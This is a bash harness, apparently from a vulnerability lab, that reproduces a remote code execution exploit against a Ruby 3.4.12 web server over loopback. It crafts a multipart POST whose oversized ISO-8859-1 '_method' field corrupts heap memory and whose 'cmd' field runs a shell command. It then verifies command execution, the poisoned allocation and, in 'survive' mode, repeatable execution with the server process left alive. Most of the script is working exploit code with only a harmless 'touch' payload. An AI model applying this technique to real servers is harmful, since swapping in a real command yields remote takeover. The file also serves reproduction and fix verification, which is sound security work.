#!/bin/bash
# Loopback-only Ruby2Shell rung-5 experiment. Usage:
#   bash lab/repro/ruby2shell-rung5-http.sh [attack|control|fixed|survive|survive-unrepaired] [tag] [ruby-bin]
set -u
cd "$(dirname "$0")/../.." || exit 1
MODE="${1:-attack}"
TAG="${2:-$MODE-1}"
if [ "$MODE" = fixed ]; then
  RB="${3:-lab/build/plain/ruby-3.4.13-plain/bin/ruby}"
else
  RB="${3:-lab/build/plain/ruby-3.4.12-plain/bin/ruby}"
fi
export GEM_PATH="$PWD/lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0${GEM_PATH:+:$GEM_PATH}"
RU=lab/repro/ruby2shell-rung5-http.ru
EV=lab/build/evidence
PORT=4549
TRACE="$EV/rung5-http-$TAG.trace"
OUT="$EV/rung5-http-$TAG.out"
SERVERLOG="$EV/rung5-http-$TAG.server.log"
MARKER="$EV/rung5-http-$TAG.marker"
MARKER2="$EV/rung5-http-$TAG.marker2"
BODY="$EV/rung5-http-$TAG.body"
BODY2="$EV/rung5-http-$TAG.body2"
mkdir -p "$EV"
rm -f "$MARKER" "$MARKER2"

build_body() {
  python3 - "$1" "$2" <<'PY'
import sys
mode, marker = sys.argv[1:]
data = (b'\xdf' * 828) if mode == 'control' else (b'a' + b'\xdf' * 827)
command = f'/usr/bin/touch {marker}'.encode()
out = [
    b'--XB\r\nContent-Disposition: form-data; name="_method"\r\n'
    b'Content-Type: text/plain; charset=ISO-8859-1\r\n\r\n',
    data,
    b'\r\n--XB\r\nContent-Disposition: form-data; name="cmd"\r\n'
    b'Content-Type: text/plain\r\n\r\n',
    command,
    b'\r\n--XB\r\nContent-Disposition: form-data; name="f"\r\n'
    b'Content-Type: text/plain\r\n\r\nfiller\r\n--XB--\r\n',
]
sys.stdout.buffer.write(b''.join(out))
PY
}

if [ "$MODE" = control ]; then
  RUBY2SHELL_R5_CONTROL=1 RUBY2SHELL_R5_TRACE="$PWD/$TRACE" \
    RUBY2SHELL_R5_MARKER="$PWD/$MARKER" MTRACE_FD=3 \
    LD_PRELOAD="$PWD/lab/preload/mtrace.so" \
    "$RB" "$RU" 3> "$TRACE" > "$SERVERLOG" 2>&1 &
else
  ENVS=("RUBY2SHELL_R5_TRACE=$PWD/$TRACE" "RUBY2SHELL_R5_MARKER=$PWD/$MARKER")
  if [ "$MODE" = survive ]; then ENVS+=(RUBY2SHELL_R5_REPAIR=1); fi
  if [ "$MODE" = survive ] || [ "$MODE" = survive-unrepaired ]; then
    ENVS+=("RUBY2SHELL_R5_MARKER2=$PWD/$MARKER2")
  fi
  env "${ENVS[@]}" MTRACE_FD=3 LD_PRELOAD="$PWD/lab/preload/mtrace.so" \
    "$RB" "$RU" 3> "$TRACE" > "$SERVERLOG" 2>&1 &
fi
SRVPID=$!
READY=NO
for _ in $(seq 1 300); do
  if curl -s -m 1 "http://127.0.0.1:$PORT/health" >/dev/null 2>&1; then
    READY=YES
    break
  fi
  sleep 0.1
done
build_body "$MODE" "$PWD/$MARKER" > "$BODY"
if [ "$MODE" = survive ] || [ "$MODE" = survive-unrepaired ]; then
  build_body attack "$PWD/$MARKER2" > "$BODY2"
fi
{
  echo "== run $TAG mode=$MODE ruby=$RB $(date -u +%H:%M:%SZ)"
  echo "ready=$READY marker=$MARKER"
  echo '-- trigger:'
  curl -s -m 30 -X POST "http://127.0.0.1:$PORT/trigger" \
    -H 'Content-Type: multipart/form-data; boundary=XB' \
    --data-binary "@$BODY" -w 'HTTP %{http_code}\n'
  if [ "$MODE" = survive ] || [ "$MODE" = survive-unrepaired ]; then
    echo '-- health after first attack:'
    curl -s -m 10 "http://127.0.0.1:$PORT/health" -w 'HTTP %{http_code}\n'
    echo '-- second trigger with distinct marker:'
    curl -s -m 30 -X POST "http://127.0.0.1:$PORT/trigger" \
      -H 'Content-Type: multipart/form-data; boundary=XB' \
      --data-binary "@$BODY2" -w 'HTTP %{http_code}\n'
  fi
} > "$OUT" 2>&1
if [ -f "$MARKER" ]; then SEEN=YES; else SEEN=NO; fi
if [ -f "$MARKER2" ]; then SEEN2=YES; else SEEN2=NO; fi
echo "marker-observed=$SEEN marker2-observed=$SEEN2" >> "$OUT"
PIDALIVE=NO
kill -0 "$SRVPID" 2>/dev/null && PIDALIVE=YES
kill "$SRVPID" 2>/dev/null
wait "$SRVPID" 2>/dev/null

TARGET=$(sed -n 's/^target=0x\([0-9a-f]*\).*/\1/p' "$TRACE" | head -1)
POPLINE=0
[ -n "$TARGET" ] && POPLINE=$(grep -c "^M [0-9]* 3e9 $TARGET " "$TRACE" || true)
cat "$OUT"
cat "$SERVERLOG"
echo "== $TAG mode=$MODE marker=$SEEN marker2=$SEEN2 pop-at-target=$POPLINE pid-alive=$PIDALIVE"
ABORT=no
grep -q 'corrupted size vs' "$SERVERLOG" && ABORT=yes
echo "== $TAG abort=$ABORT"
if [ "$MODE" = survive ] || [ "$MODE" = survive-unrepaired ]; then
  OBS=$(grep -c 'rce=OBSERVED' "$OUT")
  if [ "$MODE" = survive ] && [ "$SEEN" = YES ] && [ "$SEEN2" = YES ] &&
     [ "$PIDALIVE" = YES ] && [ "$ABORT" = no ] && [ "$OBS" -ge 2 ] &&
     grep -q 'repair=T-header-restored' "$SERVERLOG"; then
    echo 'PASS: persistent second distinct command, unchanged PID'
    exit 0
  fi
  if [ "$MODE" = survive-unrepaired ] && [ "$SEEN" = YES ] && [ "$SEEN2" = NO ] &&
     [ "$ABORT" = yes ]; then
    echo 'PASS: unrepaired control still fails persistence'
    exit 0
  fi
  echo 'FAIL'
  exit 1
fi
if [ "$MODE" = attack ]; then
  if [ "$READY" = YES ] && [ "$SEEN" = YES ] && [ "$POPLINE" -ge 1 ] &&
     grep -q 'rce=OBSERVED' "$OUT"; then
    echo 'PASS: target-process command side effect'
    exit 0
  fi
  echo 'FAIL'
  exit 1
fi
if [ "$READY" = YES ] && [ "$SEEN" = NO ] && [ "$POPLINE" -eq 0 ] &&
   grep -q 'rce=ABSENT' "$OUT"; then
  echo 'PASS: control marker absent, clean response, no poisoned pop'
  exit 0
fi
echo 'FAIL'
exit 1
